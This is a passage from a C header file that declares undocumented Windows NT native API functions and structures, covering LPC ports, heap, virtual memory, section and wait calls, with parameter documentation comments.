 CallbackId;              // \r\n    };\r\n\r\n} PORT_MESSAGE, *PPORT_MESSAGE;\r\n\r\n//\r\n// Define structure for initializing shared memory on the caller's side of the port\r\n//\r\n\r\ntypedef struct _PORT_VIEW {\r\n\r\n    ULONG  Length;                      // Size of this structure\r\n    HANDLE SectionHandle;               // Handle to section object with\r\n                                        // SECTION_MAP_WRITE and SECTION_MAP_READ\r\n    ULONG  SectionOffset;               // The offset in the section to map a view for\r\n                                        // the port data area. The offset must be aligned \r\n                                        // with the allocation granularity of the system.\r\n    SIZE_T ViewSize;                    // The size of the view (in bytes)\r\n    PVOID  ViewBase;                    // The base address of the view in the creator\r\n                                        // \r\n    PVOID  ViewRemoteBase;              // The base address of the view in the process\r\n                                        // connected to the port.\r\n} PORT_VIEW, *PPORT_VIEW;\r\n\r\n//\r\n// Define structure for shared memory coming from remote side of the port\r\n//\r\n\r\ntypedef struct _REMOTE_PORT_VIEW {\r\n\r\n    ULONG  Length;                      // Size of this structure\r\n    SIZE_T ViewSize;                    // The size of the view (bytes)\r\n    PVOID  ViewBase;                    // Base address of the view\r\n\r\n} REMOTE_PORT_VIEW, *PREMOTE_PORT_VIEW;\r\n\r\n//\r\n// Macro for initializing the message header\r\n//\r\n\r\n#ifndef InitializeMessageHeader\r\n#define InitializeMessageHeader(ph, l, t)                              \\\r\n{                                                                      \\\r\n    (ph)->u1.s1.TotalLength      = (USHORT)(l);                        \\\r\n    (ph)->u1.s1.DataLength       = (USHORT)(l - sizeof(PORT_MESSAGE)); \\\r\n    (ph)->u2.s2.Type             = (USHORT)(t);                        \\\r\n    (ph)->u2.s2.DataInfoOffset   = 0;                                  \\\r\n    (ph)->ClientId.UniqueProcess = NULL;                               \\\r\n    (ph)->ClientId.UniqueThread  = NULL;                               \\\r\n    (ph)->MessageId              = 0;                                  \\\r\n    (ph)->ClientViewSize         = 0;                                  \\\r\n}\r\n#endif\r\n\r\n/*++\r\n\r\n    NtCreatePort\r\n    ============\r\n\r\n    Creates a LPC port object. The creator of the LPC port becomes a server\r\n    of LPC communication\r\n\r\n    PortHandle - Points to a variable that will receive the\r\n        port object handle if the call is successful.\r\n\r\n    ObjectAttributes - Points to a structure that specifies the object�s\r\n        attributes. OBJ_KERNEL_HANDLE, OBJ_OPENLINK, OBJ_OPENIF, OBJ_EXCLUSIVE,\r\n        OBJ_PERMANENT, and OBJ_INHERIT are not valid attributes for a port object.\r\n\r\n    MaxConnectionInfoLength - The maximum size, in bytes, of data that can\r\n        be sent through the port.\r\n\r\n    MaxMessageLength - The maximum size, in bytes, of a message\r\n        that can be sent through the port.\r\n\r\n    MaxPoolUsage - Specifies the maximum amount of NonPaged pool that can be used for\r\n        message storage. Zero means default value.\r\n\r\n    ZwCreatePort verifies that (MaxDataSize <= 0x104) and (MaxMessageSize <= 0x148).\r\n \r\n--*/\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtCreatePort(\r\n    OUT PHANDLE PortHandle,                     \r\n    IN  POBJECT_ATTRIBUTES ObjectAttributes,\r\n    IN  ULONG MaxConnectionInfoLength,\r\n    IN  ULONG MaxMessageLength,\r\n    IN  ULONG MaxPoolUsage\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwCreatePort(\r\n    OUT PHANDLE PortHandle,                     \r\n    IN  POBJECT_ATTRIBUTES ObjectAttributes,\r\n    IN  ULONG MaxConnectionInfoLength,\r\n    IN  ULONG MaxMessageLength,\r\n    IN  ULONG MaxPoolUsage\r\n    );\r\n\r\n\r\n/*++\r\n\r\n    NtConnectPort\r\n    =============\r\n\r\n    Creates a port connected to a named port (cliend side).\r\n\r\n    PortHandle - A pointer to a variable that will receive the client\r\n        communication port object handle value.\r\n\r\n    PortName - Points to a structure that specifies the name\r\n        of the port to connect to.\r\n\r\n    SecurityQos - Points to a structure that specifies the level\r\n        of impersonation available to the port listener.\r\n\r\n    ClientView - Optionally points to a structure describing\r\n        the shared memory region used to send large amounts of data\r\n        to the listener; if the call is successful, this will be updated.\r\n\r\n    ServerView - Optionally points to a caller-allocated buffer\r\n        or variable that receives information on the shared memory region\r\n        used by the listener to send large amounts of data to the\r\n        caller.\r\n\r\n    MaxMessageLength - Optionally points to a variable that receives the size,\r\n        in bytes, of the largest message that can be sent through the port.\r\n\r\n    ConnectionInformation - Optionally points to a caller-allocated\r\n        buffer or variable that specifies connect data to send to the listener,\r\n        and receives connect data sent by the listener.\r\n\r\n    ConnectionInformationLength - Optionally points to a variable that\r\n        specifies the size, in bytes, of the connect data to send\r\n        to the listener, and receives the size of the connect data\r\n        sent by the listener.\r\n\r\n--*/\r\n \r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtConnectPort(\r\n    OUT PHANDLE PortHandle,\r\n    IN  PUNICODE_STRING PortName,\r\n    IN  PSECURITY_QUALITY_OF_SERVICE SecurityQos,\r\n    IN  OUT PPORT_VIEW ClientView OPTIONAL,\r\n    OUT PREMOTE_PORT_VIEW ServerView OPTIONAL,\r\n    OUT PULONG MaxMessageLength OPTIONAL,\r\n    IN  OUT PVOID ConnectionInformation OPTIONAL,\r\n    IN  OUT PULONG ConnectionInformationLength OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwConnectPort(\r\n    OUT PHANDLE PortHandle,\r\n    IN  PUNICODE_STRING PortName,\r\n    IN  PSECURITY_QUALITY_OF_SERVICE SecurityQos,\r\n    IN  OUT PPORT_VIEW ClientView OPTIONAL,\r\n    OUT PREMOTE_PORT_VIEW ServerView OPTIONAL,\r\n    OUT PULONG MaxMessageLength OPTIONAL,\r\n    IN  OUT PVOID ConnectionInformation OPTIONAL,\r\n    IN  OUT PULONG ConnectionInformationLength OPTIONAL\r\n    );\r\n\r\n\r\n/*++\r\n\r\n    NtListenPort\r\n    ============\r\n\r\n    Listens on a port for a connection request message on the server side.\r\n\r\n    PortHandle - A handle to a port object. The handle doesn't need \r\n        to grant any specific access.\r\n\r\n    ConnectionRequest - Points to a caller-allocated buffer\r\n        or variable that receives the connect message sent to\r\n        the port.\r\n\r\n--*/\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtListenPort(\r\n    IN  HANDLE PortHandle,\r\n    OUT PPORT_MESSAGE RequestMessage\r\n    );\r\n \r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwListenPort(\r\n    IN  HANDLE PortHandle,\r\n    OUT PPORT_MESSAGE RequestMessage\r\n    );\r\n\r\n/*++\r\n\r\n    NtAcceptConnectPort\r\n    ===================\r\n\r\n    Accepts or rejects a connection request on the server side.\r\n\r\n    PortHandle - Points to a variable that will receive the port object\r\n        handle if the call is successful.\r\n\r\n    PortContext - A numeric identifier to be associated with the port.\r\n\r\n    ConnectionRequest - Points to a caller-allocated buffer or variable\r\n        that identifies the connection request and contains any connect\r\n        data that should be returned to requestor of the connection\r\n\r\n    AcceptConnection - Specifies whether the connection should\r\n        be accepted or not\r\n\r\n    ServerView - Optionally points to a structure describing\r\n        the shared memory region used to send large amounts of data to the\r\n        requestor; if the call is successful, this will be updated\r\n\r\n    ClientView - Optionally points to a caller-allocated buffer\r\n        or variable that receives information on the shared memory\r\n        region used by the requestor to send large amounts of data to the\r\n        caller\r\n\r\n--*/\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtAcceptConnectPort(\r\n    OUT PHANDLE PortHandle,\r\n    IN  PVOID PortContext OPTIONAL,\r\n    IN  PPORT_MESSAGE ConnectionRequest,\r\n    IN  BOOLEAN AcceptConnection,\r\n    IN  OUT PPORT_VIEW ServerView OPTIONAL,\r\n    OUT PREMOTE_PORT_VIEW ClientView OPTIONAL\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwAcceptConnectPort(\r\n    OUT PHANDLE PortHandle,\r\n    IN  PVOID PortContext OPTIONAL,\r\n    IN  PPORT_MESSAGE ConnectionRequest,\r\n    IN  BOOLEAN AcceptConnection,\r\n    IN  OUT PPORT_VIEW ServerView OPTIONAL,\r\n    OUT PREMOTE_PORT_VIEW ClientView OPTIONAL\r\n    );\r\n\r\n\r\n/*++\r\n\r\n    NtCompleteConnectPort\r\n    =====================\r\n\r\n    Completes the port connection process on the server side.\r\n\r\n    PortHandle - A handle to a port object. The handle doesn't need \r\n        to grant any specific access.\r\n\r\n--*/\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtCompleteConnectPort(\r\n    IN  HANDLE PortHandle\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwCompleteConnectPort(\r\n    IN  HANDLE PortHandle\r\n    );\r\n\r\n\r\n/*++\r\n\r\n    NtRequestPort\r\n    =============\r\n\r\n    Sends a request message to a port (client side)\r\n\r\n    PortHandle - A handle to a port object. The handle doesn't need \r\n        to grant any specific access.\r\n\r\n    RequestMessage - Points to a caller-allocated buffer or variable\r\n        that specifies the request message to send to the port.\r\n\r\n--*/\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtRequestPort (\r\n    IN  HANDLE PortHandle,\r\n    IN  PPORT_MESSAGE RequestMessage\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwRequestPort (\r\n    IN  HANDLE PortHandle,\r\n    IN  PPORT_MESSAGE RequestMessage\r\n    );\r\n\r\n/*++\r\n\r\n    NtRequestWaitReplyPort\r\n    ======================\r\n\r\n    Sends a request message to a port and waits for a reply (client side)\r\n\r\n    PortHandle - A handle to a port object. The handle doesn't need \r\n        to grant any specific access.\r\n\r\n    RequestMessage - Points to a caller-allocated buffer or variable\r\n        that specifies the request message to send to the port.\r\n\r\n    ReplyMessage - Points to a caller-allocated buffer or variable\r\n        that receives the reply message sent to the port.\r\n\r\n--*/\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtRequestWaitReplyPort(\r\n    IN  HANDLE PortHandle,\r\n    IN  PPORT_MESSAGE RequestMessage,\r\n    OUT PPORT_MESSAGE ReplyMessage\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwRequestWaitReplyPort(\r\n    IN  HANDLE PortHandle,\r\n    IN  PPORT_MESSAGE RequestMessage,\r\n    OUT PPORT_MESSAGE ReplyMessage\r\n    );\r\n\r\n\r\n/*++\r\n\r\n    NtReplyPort\r\n    ===========\r\n\r\n    Sends a reply message to a port (Server side)\r\n\r\n    PortHandle - A handle to a port object. The handle doesn't need \r\n        to grant any specific access.\r\n\r\n    ReplyMessage - Points to a caller-allocated buffer or variable\r\n        that specifies the reply message to send to the port.\r\n\r\n--*/\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtReplyPort(\r\n    IN  HANDLE PortHandle,\r\n    IN  PPORT_MESSAGE ReplyMessage\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwReplyPort(\r\n    IN  HANDLE PortHandle,\r\n    IN  PPORT_MESSAGE ReplyMessage\r\n    );\r\n\r\n/*++\r\n\r\n    NtReplyWaitReplyPort\r\n    ====================\r\n\r\n    Sends a reply message to a port and waits for a reply message\r\n\r\n    PortHandle - A handle to a port object. The handle doesn't need \r\n        to grant any specific access.\r\n\r\n    ReplyMessage - Points to a caller-allocated buffer or variable\r\n        that specifies the reply message to send to the port.\r\n\r\n--*/\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtReplyWaitReplyPort(\r\n    IN  HANDLE PortHandle,\r\n    IN  OUT PPORT_MESSAGE ReplyMessage\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwReplyWaitReplyPort(\r\n    IN  HANDLE PortHandle,\r\n    IN  OUT PPORT_MESSAGE ReplyMessage\r\n    );\r\n\r\n/*++\r\n\r\n    NtReplyWaitReceivePort\r\n    ======================\r\n\r\n    Optionally sends a reply message to a port and waits for a\r\n    message\r\n\r\n    PortHandle - A handle to a port object. The handle doesn't need \r\n        to grant any specific access.\r\n\r\n    PortContext - Optionally points to a variable that receives\r\n        a numeric identifier associated with the port.\r\n\r\n    ReplyMessage - Optionally points to a caller-allocated buffer\r\n        or variable that specifies the reply message to send to the port.\r\n\r\n    ReceiveMessage - Points to a caller-allocated buffer or variable\r\n        that receives the message sent to the port.\r\n\r\n--*/\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtReplyWaitReceivePort(\r\n    IN  HANDLE PortHandle,\r\n    OUT PVOID *PortContext OPTIONAL,\r\n    IN  PPORT_MESSAGE ReplyMessage OPTIONAL,\r\n    OUT PPORT_MESSAGE ReceiveMessage\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwReplyWaitReceivePort(\r\n    IN  HANDLE PortHandle,\r\n    OUT PVOID *PortContext OPTIONAL,\r\n    IN  PPORT_MESSAGE ReplyMessage OPTIONAL,\r\n    OUT PPORT_MESSAGE ReceiveMessage\r\n    );\r\n\r\n//-----------------------------------------------------------------------------\r\n// Heap functions\r\n\r\n#define HEAP_NO_SERIALIZE               0x00000001\r\n#define HEAP_GROWABLE                   0x00000002\r\n#define HEAP_GENERATE_EXCEPTIONS        0x00000004\r\n#define HEAP_ZERO_MEMORY                0x00000008\r\n#define HEAP_REALLOC_IN_PLACE_ONLY      0x00000010\r\n#define HEAP_TAIL_CHECKING_ENABLED      0x00000020\r\n#define HEAP_FREE_CHECKING_ENABLED      0x00000040\r\n#define HEAP_DISABLE_COALESCE_ON_FREE   0x00000080\r\n#define HEAP_CREATE_ALIGN_16            0x00010000\r\n#define HEAP_CREATE_ENABLE_TRACING      0x00020000\r\n#define HEAP_MAXIMUM_TAG                0x0FFF\r\n#define HEAP_PSEUDO_TAG_FLAG            0x8000\r\n\r\n//\r\n// Data structure for heap definition. This includes various\r\n// sizing parameters and callback routines, which, if left NULL,\r\n// result in default behavior\r\n//\r\n\r\ntypedef struct RTL_HEAP_PARAMETERS {\r\n    ULONG Length;        //sizeof(RTL_HEAP_PARAMETERS)\r\n    ULONG SegmentReserve;\r\n    ULONG SegmentCommit;\r\n    ULONG DeCommitFreeBlockThreshold;\r\n    ULONG DeCommitTotalFreeThreshold;\r\n    ULONG MaximumAllocationSize;\r\n    ULONG VirtualMemoryThreshold;\r\n    ULONG InitialCommit;\r\n    ULONG InitialReserve;\r\n    PVOID CommitRoutine;\r\n    ULONG Reserved;\r\n} RTL_HEAP_PARAMETERS, *PRTL_HEAP_PARAMETERS;\r\n\r\n\r\n#define RtlProcessHeap() (HANDLE)(NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap)\r\n\r\n\r\nNTSYSAPI\r\nHANDLE\r\nNTAPI\r\nRtlCreateHeap (\r\n    IN ULONG Flags,\r\n    IN PVOID BaseAddress OPTIONAL,\r\n    IN ULONG SizeToReserve,\r\n    IN ULONG SizeToCommit,\r\n    IN BOOLEAN Lock OPTIONAL,\r\n    IN PRTL_HEAP_PARAMETERS Definition OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nULONG\r\nNTAPI\r\nRtlDestroyHeap (\r\n    IN HANDLE HeapHandle\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nPVOID\r\nNTAPI \r\nRtlAllocateHeap (\r\n    IN HANDLE HeapHandle,\r\n    IN ULONG Flags,\r\n    IN SIZE_T Size\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nPVOID\r\nNTAPI \r\nRtlReAllocateHeap (\r\n    IN HANDLE HeapHandle,\r\n    IN ULONG Flags,\r\n    IN LPVOID Address,\r\n    IN SIZE_T Size\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nBOOLEAN\r\nNTAPI\r\nRtlFreeHeap (\r\n    IN HANDLE HeapHandle,\r\n    IN ULONG Flags,\r\n    IN PVOID Address\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nULONG\r\nNTAPI\r\nRtlCompactHeap (\r\n    IN HANDLE HeapHandle,\r\n    IN ULONG Flags\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nBOOLEAN\r\nNTAPI\r\nRtlLockHeap (\r\n    IN HANDLE HeapHandle\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nBOOLEAN\r\nNTAPI\r\nRtlUnlockHeap (\r\n    IN HANDLE HeapHandle\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nULONG\r\nNTAPI\r\nRtlSizeHeap (\r\n    IN HANDLE HeapHandle,\r\n    IN ULONG Flags,\r\n    IN PVOID Address\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nBOOLEAN\r\nNTAPI\r\nRtlValidateHeap (\r\n    IN HANDLE HeapHandle,\r\n    IN ULONG Flags,\r\n    IN PVOID Address OPTIONAL\r\n    );\r\n\r\n\r\n//-----------------------------------------------------------------------------\r\n// Virtual memory functions\r\n\r\ntypedef enum _MEMORY_INFORMATION_CLASS\r\n{\r\n    MemoryBasicInformation,                 // 0x00 MEMORY_BASIC_INFORMATION\r\n    MemoryWorkingSetInformation,            // 0x01\r\n    MemoryMappedFilenameInformation,        // 0x02 UNICODE_STRING\r\n    MemoryRegionInformation,                // 0x03\r\n    MemoryWorkingSetExInformation           // 0x04\r\n\r\n} MEMORY_INFORMATION_CLASS;\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtAllocateVirtualMemory (\r\n    IN HANDLE ProcessHandle,\r\n    IN OUT PVOID *BaseAddress,\r\n    IN ULONG ZeroBits,\r\n    IN OUT PSIZE_T RegionSize,\r\n    IN ULONG AllocationType,\r\n    IN ULONG Protect\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwAllocateVirtualMemory (\r\n    IN HANDLE ProcessHandle,\r\n    IN OUT PVOID *BaseAddress,\r\n    IN ULONG ZeroBits,\r\n    IN OUT PSIZE_T RegionSize,\r\n    IN ULONG AllocationType,\r\n    IN ULONG Protect\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtFreeVirtualMemory (\r\n    IN HANDLE ProcessHandle,\r\n    IN OUT PVOID *BaseAddress,\r\n    IN OUT PSIZE_T RegionSize,\r\n    IN ULONG FreeType\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwFreeVirtualMemory (\r\n    IN HANDLE ProcessHandle,\r\n    IN OUT PVOID *BaseAddress,\r\n    IN OUT PSIZE_T RegionSize,\r\n    IN ULONG FreeType\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtProtectVirtualMemory(\r\n    IN HANDLE ProcessHandle,\r\n    IN OUT PVOID *BaseAddress,\r\n    IN OUT PSIZE_T RegionSize,\r\n    IN ULONG NewProtect,\r\n    OUT PULONG OldProtect\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwProtectVirtualMemory(\r\n    IN HANDLE ProcessHandle,\r\n    IN OUT PVOID *BaseAddress,\r\n    IN OUT PSIZE_T RegionSize,\r\n    IN ULONG NewProtect,\r\n    OUT PULONG OldProtect\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtReadVirtualMemory(\r\n    IN HANDLE ProcessHandle,\r\n    IN PVOID BaseAddress,\r\n    OUT PVOID Buffer,\r\n    IN ULONG BufferSize,\r\n    OUT PULONG NumberOfBytesRead OPTIONAL\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwReadVirtualMemory(\r\n    IN HANDLE ProcessHandle,\r\n    IN PVOID BaseAddress,\r\n    OUT PVOID Buffer,\r\n    IN ULONG BufferSize,\r\n    OUT PULONG NumberOfBytesRead OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtWriteVirtualMemory(\r\n    IN HANDLE ProcessHandle,\r\n    IN PVOID BaseAddress,\r\n    IN PVOID Buffer,\r\n    IN ULONG BufferSize,\r\n    OUT PULONG NumberOfBytesWritten OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwWriteVirtualMemory(\r\n    IN HANDLE ProcessHandle,\r\n    IN PVOID BaseAddress,\r\n    IN PVOID Buffer,\r\n    IN ULONG BufferSize,\r\n    OUT PULONG NumberOfBytesWritten OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtFlushVirtualMemory (\r\n    IN HANDLE ProcessHandle,\r\n    IN OUT PVOID *BaseAddress,\r\n    IN OUT PSIZE_T RegionSize,\r\n    OUT PIO_STATUS_BLOCK IoStatus\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwFlushVirtualMemory (\r\n    IN HANDLE ProcessHandle,\r\n    IN OUT PVOID *BaseAddress,\r\n    IN OUT PSIZE_T RegionSize,\r\n    OUT PIO_STATUS_BLOCK IoStatus\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtQueryVirtualMemory(\r\n    IN HANDLE ProcessHandle,\r\n    IN PVOID BaseAddress,\r\n    IN MEMORY_INFORMATION_CLASS MemoryInformationClass,\r\n    OUT PVOID MemoryInformation,\r\n    IN SIZE_T MemoryInformationLength,\r\n    OUT PSIZE_T ReturnLength OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwQueryVirtualMemory(\r\n    IN HANDLE ProcessHandle,\r\n    IN PVOID BaseAddress,\r\n    IN MEMORY_INFORMATION_CLASS MemoryInformationClass,\r\n    OUT PVOID MemoryInformation,\r\n    IN SIZE_T MemoryInformationLength,\r\n    OUT PSIZE_T ReturnLength OPTIONAL\r\n    );\r\n\r\n//-----------------------------------------------------------------------------\r\n// Section functions\r\n\r\ntypedef enum _SECTION_INHERIT\r\n{\r\n    ViewShare = 1,\r\n    ViewUnmap = 2\r\n\r\n} SECTION_INHERIT;\r\n\r\n\r\ntypedef enum _SECTION_INFORMATION_CLASS\r\n{\r\n    SectionBasicInformation,\r\n    SectionImageInformation\r\n\r\n} SECTION_INFORMATION_CLASS, *PSECTION_INFORMATION_CLASS;\r\n\r\n\r\n/*++\r\n\r\n    NtCreateSection\r\n    ===============\r\n\r\n    Creates a section object.\r\n\r\n    SectionHandle - Points to a variable that will receive the section\r\n        object handle if the call is successful.\r\n\r\n    DesiredAccess - Specifies the type of access that the caller requires\r\n        to the section object. This parameter can be zero, or any combination\r\n        of the following flags:\r\n\r\n        SECTION_QUERY       - Query access\r\n        SECTION_MAP_WRITE   - Can be written when mapped\r\n        SECTION_MAP_READ    - Can be read when mapped\r\n        SECTION_MAP_EXECUTE - Can be executed when mapped\r\n        SECTION_EXTEND_SIZE - Extend access\r\n        SECTION_ALL_ACCESS  - All of the preceding +\r\n                              STANDARD_RIGHTS_REQUIRED\r\n\r\n    ObjectAttributes - Points to a structure that specifies the object�s attributes.\r\n        OBJ_OPENLINK is not a valid attribute for a section object.\r\n\r\n    MaximumSize - Optionally points to a variable that specifies the size,\r\n        in bytes, of the section. If FileHandle is zero, the size must be\r\n        specified; otherwise, it can be defaulted from the size of the file\r\n        referred to by FileHandle.\r\n\r\n    SectionPageProtection - The protection desired for the pages\r\n        of the section when the section is mapped. This parameter can take\r\n        one of the following values:\r\n\r\n        PAGE_READONLY\r\n        PAGE_READWRITE\r\n        PAGE_WRITECOPY\r\n        PAGE_EXECUTE\r\n        PAGE_EXECUTE_READ\r\n        PAGE_EXECUTE_READWRITE\r\n        PAGE_EXECUTE_WRITECOPY\r\n\r\n    AllocationAttributes - The attributes for the section. This parameter must\r\n        be a combination of the following values:\r\n\r\n        SEC_BASED     0x00200000    // Map section at same address in each process\r\n        SEC_NO_CHANGE 0x00400000    // Disable changes to protection of pages\r\n        SEC_IMAGE     0x01000000    // Map section as an image\r\n        SEC_VLM       0x02000000    // Map section in VLM region\r\n        SEC_RESERVE   0x04000000    // Reserve without allocating pagefile storage\r\n        SEC_COMMIT    0x08000000    // Commit pages; the default behavior\r\n        SEC_NOCACHE   0x10000000    // Mark pages as non-cacheable\r\n\r\n    FileHandle - Identifies the file from which to create the section object.\r\n        The file must be opened with an access mode compatible with the protection\r\n        flags specified by the Protect parameter. If FileHandle is zero,\r\n        the function creates a section object of the specified size backed\r\n        by the paging file rather than by a named file in the file system.\r\n\r\n--*/\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtCreateSection(\r\n    OUT PHANDLE SectionHandle,\r\n    IN  ACCESS_MASK DesiredAccess,\r\n    IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,\r\n    IN  PLARGE_INTEGER MaximumSize OPTIONAL,\r\n    IN  ULONG SectionPageProtection,\r\n    IN  ULONG AllocationAttributes,\r\n    IN  HANDLE FileHandle OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwCreateSection(\r\n    OUT PHANDLE SectionHandle,\r\n    IN  ACCESS_MASK DesiredAccess,\r\n    IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,\r\n    IN  PLARGE_INTEGER MaximumSize OPTIONAL,\r\n    IN  ULONG SectionPageProtection,\r\n    IN  ULONG AllocationAttributes,\r\n    IN  HANDLE FileHandle OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtOpenSection (\r\n    OUT PHANDLE SectionHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwOpenSection (\r\n    OUT PHANDLE SectionHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtMapViewOfSection (\r\n    IN HANDLE SectionHandle,\r\n    IN HANDLE ProcessHandle,\r\n    IN OUT PVOID *BaseAddress,\r\n    IN ULONG ZeroBits,\r\n    IN ULONG CommitSize,\r\n    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,\r\n    IN OUT PULONG ViewSize,\r\n    IN SECTION_INHERIT InheritDisposition,\r\n    IN ULONG AllocationType,\r\n    IN ULONG Protect\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwMapViewOfSection (\r\n    IN HANDLE SectionHandle,\r\n    IN HANDLE ProcessHandle,\r\n    IN OUT PVOID *BaseAddress,\r\n    IN ULONG ZeroBits,\r\n    IN ULONG CommitSize,\r\n    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,\r\n    IN OUT PULONG ViewSize,\r\n    IN SECTION_INHERIT InheritDisposition,\r\n    IN ULONG AllocationType,\r\n    IN ULONG Protect\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtUnmapViewOfSection (\r\n    IN HANDLE ProcessHandle,\r\n    IN PVOID BaseAddress\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwUnmapViewOfSection (\r\n    IN HANDLE ProcessHandle,\r\n    IN PVOID BaseAddress\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtExtendSection (\r\n    IN HANDLE SectionHandle,\r\n    IN OUT PLARGE_INTEGER SectionSize\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwExtendSection (\r\n    IN HANDLE SectionHandle,\r\n    IN OUT PLARGE_INTEGER SectionSize\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtQuerySection (\r\n    IN HANDLE SectionHandle,\r\n    IN SECTION_INFORMATION_CLASS SectionInformationClass,\r\n    OUT PVOID SectionInformation,\r\n    IN ULONG Length,\r\n    OUT PULONG ResultLength OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwQuerySection (\r\n    IN HANDLE SectionHandle,\r\n    IN SECTION_INFORMATION_CLASS SectionInformationClass,\r\n    OUT PVOID SectionInformation,\r\n    IN ULONG Length,\r\n    OUT PULONG ResultLength OPTIONAL\r\n    );\r\n\r\n\r\n//-----------------------------------------------------------------------------\r\n// Synchronization\r\n\r\n//\r\n// Wait type\r\n//\r\n\r\ntypedef enum _WAIT_TYPE {\r\n    WaitAll,\r\n    WaitAny\r\n    } WAIT_TYPE;\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwWaitForSingleObject (\r\n    IN HANDLE Handle,\r\n    IN BOOLEAN Alertable,\r\n    IN PLARGE_INTEGER Timeout OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtWaitForMultipleObjects (\r\n    IN ULONG Count,\r\n    IN HANDLE Handle[],\r\n    IN WAIT_TYPE WaitType,\r\n    IN BOOLEAN Alertable,\r\n    IN PLARGE_INTEGER Timeout OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwWaitForMultipleObjects (\r\n    IN ULONG Count,\r\n    IN 